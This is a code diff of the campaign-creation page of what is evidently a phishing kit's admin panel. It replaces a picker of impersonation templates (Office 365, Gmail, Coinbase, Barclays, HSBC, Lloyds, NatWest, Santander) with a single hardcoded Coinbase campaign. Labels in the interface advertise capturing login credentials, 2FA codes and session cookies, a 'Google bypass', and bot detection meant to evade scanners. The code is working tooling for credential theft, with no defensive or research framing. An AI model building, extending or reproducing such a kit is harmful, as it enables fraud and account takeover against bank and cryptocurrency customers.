@@ -34,7 +34,6 @@ const campaignFormSchema = insertCampaignSchema.extend({
 type CampaignFormData = z.infer<typeof campaignFormSchema>;
 
 export default function CreateCampaignPage() {
-  const [selectedCampaignType, setSelectedCampaignType] = useState<"office365" | "gmail" | "coinbase" | "barclays" | "hsbc" | "lloyds" | "natwest" | "santander">("office365");
   const [recipientsFile, setRecipientsFile] = useState<File | null>(null);
   const [imageFiles, setImageFiles] = useState<File[]>([]);
   const { toast } = useToast();
@@ -43,12 +42,12 @@ export default function CreateCampaignPage() {
   const form = useForm<CampaignFormData>({
     resolver: zodResolver(campaignFormSchema),
     defaultValues: {
-      type: "office365",
+      type: "coinbase",
       delayMs: 2000,
       botDetectionEnabled: true,
       detectionLevel: "medium",
       redirectUrl: "https://www.coinbase.com/signin",
-      customPath: "/Log",
+      customPath: "/coinbase",
     },
   });
 
@@ -92,7 +91,7 @@ export default function CreateCampaignPage() {
     try {
       const campaign = await createCampaignMutation.mutateAsync({
         ...data,
-        type: selectedCampaignType,
+        type: "coinbase",
       });
 
       // Upload recipients file if provided
@@ -110,14 +109,14 @@ export default function CreateCampaignPage() {
   // Handle preview campaign
   const handlePreviewCampaign = () => {
     const formData = form.getValues();
-    const previewUrl = `/preview/${selectedCampaignType}?customPath=${encodeURIComponent(formData.customPath || '/Log')}`;
+    const previewUrl = `/coinbase?customPath=${encodeURIComponent(formData.customPath || '/coinbase')}`;
     
     // Open preview in new tab
     window.open(previewUrl, '_blank');
     
     toast({
       title: "Preview Opened",
-      description: `Campaign preview opened in new tab for ${selectedCampaignType.toUpperCase()}`,
+      description: "Coinbase campaign preview opened in new tab",
     });
   };
 
@@ -164,330 +163,33 @@ export default function CreateCampaignPage() {
 
       <div className="p-6 max-w-6xl mx-auto">
         <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
-          {/* Campaign Type Selector */}
+          {/* Coinbase Campaign Info */}
           <Card>
             <CardContent className="p-6">
-              <h3 className="text-lg font-semibold text-foreground mb-6">Select Campaign Type</h3>
+              <div className="flex items-center space-x-4 mb-6">
+                <div className="w-16 h-16 bg-blue-600/20 rounded-lg flex items-center justify-center">
+                  <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-lg font-bold">₿</div>
+                </div>
+                <div>
+                  <h3 className="text-xl font-semibold text-foreground">Coinbase Campaign</h3>
+                  <p className="text-muted-foreground">Target cryptocurrency users with authentic Coinbase login portal</p>
+                </div>
+              </div>
               
-              {/* Email & Platform Campaigns */}
-              <div className="mb-8">
-                <h4 className="text-md font-medium text-foreground mb-4 flex items-center">
-                  <span className="mr-2">📧</span>
-                  Email & Platform Campaigns
-                </h4>
-                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                  <Card 
-                className={`cursor-pointer transition-all duration-200 ${
-                  selectedCampaignType === "office365" 
-                    ? "border-primary bg-primary/5" 
-                    : "border-border hover:bg-muted/20"
-                }`}
-                onClick={() => {
-                  setSelectedCampaignType("office365");
-                  form.setValue("type", "office365");
-                }}
-                data-testid="card-office365"
-              >
-                <CardContent className="p-6">
-                  <div className="flex items-center justify-between mb-4">
-                    <div className="flex items-center space-x-3">
-                      <div className="w-12 h-12 bg-primary/20 rounded-lg flex items-center justify-center">
-                        <Computer className="w-6 h-6 text-primary" />
-                      </div>
-                      <div>
-                        <h4 className="text-lg font-semibold text-foreground">Office 365</h4>
-                        <p className="text-sm text-muted-foreground">Target Computer Office 365 users with login portal</p>
-                      </div>
-                    </div>
-                    {selectedCampaignType === "office365" && (
-                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                      </div>
-                    )}
-                  </div>
-                  <ul className="text-sm text-muted-foreground space-y-1">
-                    <li>• Model: Computer 365</li>
-                    <li>• Captures Computer credentials and session cookies</li>
-                    <li>• High success rate for corporate environments</li>
-                  </ul>
-                </CardContent>
-              </Card>
-
-              <Card 
-                className={`cursor-pointer transition-all duration-200 ${
-                  selectedCampaignType === "gmail" 
-                    ? "border-primary bg-primary/5" 
-                    : "border-border hover:bg-muted/20"
-                }`}
-                onClick={() => {
-                  setSelectedCampaignType("gmail");
-                  form.setValue("type", "gmail");
-                }}
-                data-testid="card-gmail"
-              >
-                <CardContent className="p-6">
-                  <div className="flex items-center justify-between mb-4">
-                    <div className="flex items-center space-x-3">
-                      <div className="w-12 h-12 bg-blue-500/20 rounded-lg flex items-center justify-center">
-                        <Mail className="w-6 h-6 text-blue-400" />
-                      </div>
-                      <div>
-                        <h4 className="text-lg font-semibold text-foreground">Gmail</h4>
-                        <p className="text-sm text-muted-foreground">Target Google Mail users with Google login portal</p>
-                      </div>
-                    </div>
-                    {selectedCampaignType === "gmail" && (
-                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                      </div>
-                    )}
-                  </div>
-                  <ul className="text-sm text-muted-foreground space-y-1">
-                    <li>• Model: Gmail</li>
-                    <li>• Uses Google bypass for improved success rate</li>
-                    <li>• Effective for personal and workspace accounts</li>
-                  </ul>
-                </CardContent>
-              </Card>
-
-              <Card 
-                className={`cursor-pointer transition-all duration-200 ${
-                  selectedCampaignType === "coinbase" 
-                    ? "border-primary bg-primary/5" 
-                    : "border-border hover:bg-muted/20"
-                }`}
-                onClick={() => {
-                  setSelectedCampaignType("coinbase");
-                  form.setValue("type", "coinbase");
-                }}
-                data-testid="card-coinbase"
-              >
-                <CardContent className="p-6">
-                  <div className="flex items-center justify-between mb-4">
-                    <div className="flex items-center space-x-3">
-                      <div className="w-12 h-12 bg-blue-600/20 rounded-lg flex items-center justify-center">
-                        <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs font-bold">₿</div>
-                      </div>
-                      <div>
-                        <h4 className="text-lg font-semibold text-foreground">Coinbase</h4>
-                        <p className="text-sm text-muted-foreground">Target cryptocurrency users with authentic login portal</p>
-                      </div>
-                    </div>
-                    {selectedCampaignType === "coinbase" && (
-                      <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                        <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                      </div>
-                    )}
-                  </div>
-                  <ul className="text-sm text-muted-foreground space-y-1">
-                    <li>• Model: Coinbase Exchange</li>
-                    <li>• Captures login credentials and 2FA codes</li>
-                    <li>• High success rate for crypto traders</li>
-                  </ul>
-                  </CardContent>
-                </Card>
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 p-4 bg-muted/30 rounded-lg">
+                <div>
+                  <h4 className="font-medium text-foreground">Platform</h4>
+                  <p className="text-sm text-muted-foreground">Coinbase Exchange</p>
+                </div>
+                <div>
+                  <h4 className="font-medium text-foreground">Target</h4>
+                  <p className="text-sm text-muted-foreground">Crypto traders & investors</p>
+                </div>
+                <div>
+                  <h4 className="font-medium text-foreground">Captures</h4>
+                  <p className="text-sm text-muted-foreground">Login credentials & 2FA</p>
+                </div>
               </div>
-            </div>
-
-            {/* UK Banking Campaigns */}
-            <div className="mb-6">
-              <h4 className="text-md font-medium text-foreground mb-4 flex items-center">
-                <span className="mr-2">🏦</span>
-                UK Banking Campaigns
-              </h4>
-              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-
-                {/* Barclays */}
-                <Card 
-                  className={`cursor-pointer transition-all duration-200 ${
-                    selectedCampaignType === "barclays" 
-                      ? "border-primary bg-primary/5" 
-                      : "border-border hover:bg-muted/20"
-                  }`}
-                  onClick={() => {
-                    setSelectedCampaignType("barclays");
-                    form.setValue("type", "barclays");
-                  }}
-                  data-testid="card-barclays"
-                >
-                  <CardContent className="p-6">
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center space-x-3">
-                        <div className="w-12 h-12 bg-blue-800/20 rounded-lg flex items-center justify-center">
-                          <div className="text-lg font-bold text-blue-700">B</div>
-                        </div>
-                        <div>
-                          <h4 className="text-lg font-semibold text-foreground">Barclays</h4>
-                          <p className="text-sm text-muted-foreground">Target UK banking customers with authentic portal</p>
-                        </div>
-                      </div>
-                      {selectedCampaignType === "barclays" && (
-                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                        </div>
-                      )}
-                    </div>
-                    <ul className="text-sm text-muted-foreground space-y-1">
-                      <li>• Model: Barclays Online Banking</li>
-                      <li>• Captures login and security details</li>
-                      <li>• High recognition in UK market</li>
-                    </ul>
-                  </CardContent>
-                </Card>
-
-                {/* HSBC */}
-                <Card 
-                  className={`cursor-pointer transition-all duration-200 ${
-                    selectedCampaignType === "hsbc" 
-                      ? "border-primary bg-primary/5" 
-                      : "border-border hover:bg-muted/20"
-                  }`}
-                  onClick={() => {
-                    setSelectedCampaignType("hsbc");
-                    form.setValue("type", "hsbc");
-                  }}
-                  data-testid="card-hsbc"
-                >
-                  <CardContent className="p-6">
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center space-x-3">
-                        <div className="w-12 h-12 bg-red-600/20 rounded-lg flex items-center justify-center">
-                          <div className="text-sm font-bold text-red-600">HSBC</div>
-                        </div>
-                        <div>
-                          <h4 className="text-lg font-semibold text-foreground">HSBC</h4>
-                          <p className="text-sm text-muted-foreground">Global banking with strong UK presence</p>
-                        </div>
-                      </div>
-                      {selectedCampaignType === "hsbc" && (
-                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                        </div>
-                      )}
-                    </div>
-                    <ul className="text-sm text-muted-foreground space-y-1">
-                      <li>• Model: HSBC UK Online Banking</li>
-                      <li>• Targets business and personal accounts</li>
-                      <li>• Effective for professional users</li>
-                    </ul>
-                  </CardContent>
-                </Card>
-
-                {/* Lloyds */}
-                <Card 
-                  className={`cursor-pointer transition-all duration-200 ${
-                    selectedCampaignType === "lloyds" 
-                      ? "border-primary bg-primary/5" 
-                      : "border-border hover:bg-muted/20"
-                  }`}
-                  onClick={() => {
-                    setSelectedCampaignType("lloyds");
-                    form.setValue("type", "lloyds");
-                  }}
-                  data-testid="card-lloyds"
-                >
-                  <CardContent className="p-6">
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center space-x-3">
-                        <div className="w-12 h-12 bg-green-700/20 rounded-lg flex items-center justify-center">
-                          <div className="text-lg font-bold text-green-700">L</div>
-                        </div>
-                        <div>
-                          <h4 className="text-lg font-semibold text-foreground">Lloyds Banking</h4>
-                          <p className="text-sm text-muted-foreground">Popular high street banking solution</p>
-                        </div>
-                      </div>
-                      {selectedCampaignType === "lloyds" && (
-                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                        </div>
-                      )}
-                    </div>
-                    <ul className="text-sm text-muted-foreground space-y-1">
-                      <li>• Model: Lloyds Internet Banking</li>
-                      <li>• Wide customer base coverage</li>
-                      <li>• Trusted brand recognition</li>
-                    </ul>
-                  </CardContent>
-                </Card>
-
-                {/* NatWest */}
-                <Card 
-                  className={`cursor-pointer transition-all duration-200 ${
-                    selectedCampaignType === "natwest" 
-                      ? "border-primary bg-primary/5" 
-                      : "border-border hover:bg-muted/20"
-                  }`}
-                  onClick={() => {
-                    setSelectedCampaignType("natwest");
-                    form.setValue("type", "natwest");
-                  }}
-                  data-testid="card-natwest"
-                >
-                  <CardContent className="p-6">
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center space-x-3">
-                        <div className="w-12 h-12 bg-purple-700/20 rounded-lg flex items-center justify-center">
-                          <div className="text-sm font-bold text-purple-700">NW</div>
-                        </div>
-                        <div>
-                          <h4 className="text-lg font-semibold text-foreground">NatWest</h4>
-                          <p className="text-sm text-muted-foreground">Leading UK retail and business banking</p>
-                        </div>
-                      </div>
-                      {selectedCampaignType === "natwest" && (
-                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                        </div>
-                      )}
-                    </div>
-                    <ul className="text-sm text-muted-foreground space-y-1">
-                      <li>• Model: NatWest Online Banking</li>
-                      <li>• Strong business banking focus</li>
-                      <li>• Distinctive purple branding</li>
-                    </ul>
-                  </CardContent>
-                </Card>
-
-                {/* Santander */}
-                <Card 
-                  className={`cursor-pointer transition-all duration-200 ${
-                    selectedCampaignType === "santander" 
-                      ? "border-primary bg-primary/5" 
-                      : "border-border hover:bg-muted/20"
-                  }`}
-                  onClick={() => {
-                    setSelectedCampaignType("santander");
-                    form.setValue("type", "santander");
-                  }}
-                  data-testid="card-santander"
-                >
-                  <CardContent className="p-6">
-                    <div className="flex items-center justify-between mb-4">
-                      <div className="flex items-center space-x-3">
-                        <div className="w-12 h-12 bg-red-700/20 rounded-lg flex items-center justify-center">
-                          <div className="text-sm font-bold text-red-700">S</div>
-                        </div>
-                        <div>
-                          <h4 className="text-lg font-semibold text-foreground">Santander</h4>
-                          <p className="text-sm text-muted-foreground">International banking with UK operations</p>
-                        </div>
-                      </div>
-                      {selectedCampaignType === "santander" && (
-                        <div className="w-6 h-6 rounded-full bg-primary flex items-center justify-center">
-                          <CheckCircle className="w-3 h-3 text-primary-foreground" />
-                        </div>
-                      )}
-                    </div>
-                    <ul className="text-sm text-muted-foreground space-y-1">
-                      <li>• Model: Santander Online Banking</li>
-                      <li>• Popular mortgage and savings provider</li>
-                      <li>• Effective for UK customers</li>
-                    </ul>
-                  </CardContent>
-                </Card>
-              </div>
-            </div>
             </CardContent>
           </Card>
 
